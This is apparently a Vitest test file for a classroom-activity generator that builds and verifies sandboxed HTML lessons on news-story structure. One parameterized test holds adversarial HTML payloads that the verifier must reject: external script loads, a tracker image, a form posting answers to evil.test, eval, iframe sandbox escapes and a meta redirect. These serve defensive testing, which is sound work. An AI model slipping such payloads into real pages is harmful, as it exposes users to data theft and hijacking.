import { describe, expect, it } from "vitest";
import type { LessonState } from "@kobi/ai-core";
import type { CurriculumMatch } from "@kobi/curriculum";
import {
  activitySdkMessageSchema,
  authorizeActivityTelemetryMessage,
  buildActivitySessionContext,
  createActivityArtifactCandidates,
  createUnguessableBundleRef,
  resolveApprovedActivityForBand,
  verifyActivityArtifact,
} from "./server.js";

const lessonState: LessonState = {
  topic: "La noticia y sus partes",
  objective_guess: "Identificar titular, entradilla y fuente en una noticia breve",
  key_terms: ["titular", "entradilla", "fuente", "hecho principal"],
  transcript_summary:
    "La docente explico las partes de una noticia con ejemplos del periodico escolar.",
  confidence: 0.88,
  evidence: {
    quoted_phrases: ["titular de la noticia", "la fuente nos dice quien informa"],
    reason: "La clase se centro en reconocer partes de una noticia.",
  },
};

const curriculumMatches: CurriculumMatch[] = [
  {
    objective_code: "L7.4.2",
    unit: "U4",
    grade: 7,
    subject: "lenguaje",
    text: "Reconoce la estructura de la noticia: titular, entradilla, cuerpo y fuente.",
    similarity: 0.91,
  },
];

describe("activity artifact contracts", () => {
  it("builds bounded session context from lesson_state only", () => {
    const context = buildActivitySessionContext([lessonState]);

    expect(context.latest_topic).toBe("La noticia y sus partes");
    expect(context.vocabulary).toContain("titular");
    expect(JSON.stringify(context)).not.toContain("periodico escolar");
  });

  it("creates three verified HTML artifact candidates", () => {
    const context = buildActivitySessionContext([lessonState]);
    const candidates = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
    });

    expect(candidates).toHaveLength(3);
    expect(candidates.map((candidate) => candidate.manifest.difficulty_band)).toEqual([
      "support",
      "core",
      "challenge",
    ]);

    for (const candidate of candidates) {
      const result = verifyActivityArtifact(candidate);
      expect(result.ok).toBe(true);
      expect(result.artifact.status).toBe("verified");
      expect(result.artifact.evidence[0].objective_code).toBe("L7.4.2");
      expect(candidate.bundle_html).not.toContain("preview-assignment");
      expect(candidate.bundle_html).not.toContain("assignment_id:");
    }
  });

  it("creates cryptographically unguessable bundle references", () => {
    const first = createUnguessableBundleRef("static");
    const second = createUnguessableBundleRef("static");

    expect(first).toMatch(
      /^artifact-bundles\/static\/[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\/index\.html$/,
    );
    expect(second).not.toBe(first);
  });

  it.each([
    ["script injection", "<script src='https://evil.test/payload.js'></script>", "external or executable URL references are forbidden"],
    ["unsafe event handler", "<button onclick='window.top.location=`https://evil.test`'>Salir</button>", "inline event handlers are forbidden"],
    ["external network reference", "<img src='https://evil.test/tracker.png'>", "external or executable URL references are forbidden"],
    ["root-relative subresource", "<img src='/activity.js'>", "external or executable URL references are forbidden"],
    ["dot-relative subresource", "<script src='./main.js'></script>", "external or executable URL references are forbidden"],
    ["relative poster", "<video poster='asset.png'></video>", "external or executable URL references are forbidden"],
    ["relative srcset candidate", "<img srcset='asset.png 1x'>", "external or executable URL references are forbidden"],
    ["style import", "<style>@import './theme.css';</style>", "CSS URL references are forbidden"],
    ["style URL", "<style>body { background: url(asset.png); }</style>", "CSS URL references are forbidden"],
    ["eval", "<script>eval('reportComplete()')</script>", "eval is forbidden"],
    ["Function constructor", "<script>new Function('reportComplete()')()</script>", "Function constructor is forbidden"],
    ["data script URL", "<script src='data:text/javascript,alert(1)'></script>", "external or executable URL references are forbidden"],
    ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
    ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
    ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
    ["sandbox escape", "<iframe sandbox='allow-same-origin allow-top-navigation' srcdoc='<p>escape</p>'></iframe>", "nested browsing contexts are forbidden"],
    ["template descendants", "<template><iframe srcdoc='<p>escape</p>'></iframe></template>", "nested browsing contexts are forbidden"],
    ["script markup string", "<script>document.body.insertAdjacentHTML('beforeend', '<iframe srcdoc=\"<p>escape</p>\"></iframe>')</script>", "nested browsing contexts are forbidden"],
    ["meta navigation", "<meta http-equiv='refresh' content='0;url=https://evil.test'>", "meta refresh is forbidden"],
  ])("rejects adversarial %s artifacts with a specific reason", (_name, payload, reason) => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
    });
    candidate.bundle_html = candidate.bundle_html.replace("</body>", `${payload}</body>`);

    const result = verifyActivityArtifact(candidate);

    expect(result.ok).toBe(false);
    expect(result.errors).toContain(reason);
  });

  it("allows data URLs for inline assets", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
    });
    candidate.bundle_html = candidate.bundle_html.replace(
      "</body>",
      '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x" alt="Punto"> </body>',
    );

    expect(verifyActivityArtifact(candidate).ok).toBe(true);
  });

  it("rejects relative srcset candidates after an allowed data URL", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
    });
    candidate.bundle_html = candidate.bundle_html.replace(
      "</body>",
      '<img srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x, asset.png 2x" alt="Punto"> </body>',
    );

    const result = verifyActivityArtifact(candidate);
    expect(result.ok).toBe(false);
    expect(result.errors).toContain("external or executable URL references are forbidden");
  });

  it("validates SDK telemetry messages", () => {
    const result = activitySdkMessageSchema.safeParse({
      sdk: "activity-sdk/v1",
      type: "event",
      method: "reportAttempt",
      payload: {
        assignment_id: "assignment-1",
        item_index: 0,
        correct: true,
      },
    });

    expect(result.success).toBe(true);
  });

  it("falls back to approved core activity for unapproved bands", () => {
    const approvals = [
      {
        difficulty_band: "core" as const,
        activity_id: "activity-core",
        candidate_id: "candidate-core",
        approved: true,
      },
      {
        difficulty_band: "challenge" as const,
        activity_id: "activity-challenge",
        candidate_id: "candidate-challenge",
        approved: false,
      },
    ];

    expect(resolveApprovedActivityForBand(approvals, "challenge")?.activity_id).toBe(
      "activity-core",
    );
    expect(resolveApprovedActivityForBand(approvals, "support")?.candidate_id).toBe(
      "candidate-core",
    );
    expect(resolveApprovedActivityForBand(approvals, "unknown")?.candidate_id).toBe(
      "candidate-core",
    );
  });

  it("authorizes telemetry from parent-owned assignment context", () => {
    const result = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportAttempt",
        payload: {
          assignment_id: "assignment-1",
          item_index: 0,
          correct: true,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
        eventOrigin: "https://kobi.test",
        allowedOrigin: "https://kobi.test",
      },
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.event).toMatchObject({
      assignment_id: "assignment-1",
      type: "attempt",
    });
  });

  it("stamps missing telemetry assignment ids from parent context", () => {
    const result = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportHint",
        payload: {
          item_index: 0,
          hint_index: 0,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
      },
    );

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.event).toMatchObject({
      assignment_id: "assignment-1",
      type: "hint",
      payload: {
        assignment_id: "assignment-1",
        item_index: 0,
        hint_index: 0,
      },
    });
  });

  it("rejects telemetry with spoofed assignment ids or rate-limit violations", () => {
    const spoofed = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportComplete",
        payload: {
          assignment_id: "other-assignment",
          score: 1,
          total: 1,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
      },
    );

    const rateLimited = authorizeActivityTelemetryMessage(
      {
        sdk: "activity-sdk/v1",
        type: "event",
        method: "reportHint",
        payload: {
          assignment_id: "assignment-1",
          item_index: 0,
          hint_index: 0,
        },
      },
      {
        assignmentId: "assignment-1",
        sourceMatches: true,
        eventsInRateWindow: 30,
      },
    );

    expect(spoofed.ok).toBe(false);
    expect(rateLimited.ok).toBe(false);
  });

  it("rejects artifacts that fail rubric thresholds", () => {
    const context = buildActivitySessionContext([lessonState]);
    const [candidate] = createActivityArtifactCandidates({
      lessonState,
      sessionContext: context,
      curriculumMatches,
    });
    candidate.manifest.content.items[0].hints = ["La respuesta es titular"];

    const result = verifyActivityArtifact(candidate);

    expect(result.ok).toBe(false);
    expect(result.artifact.status).toBe("rejected");
    expect(result.errors).toContain("rubric: hint_leakage 0.35 is below 0.80");
  });
});
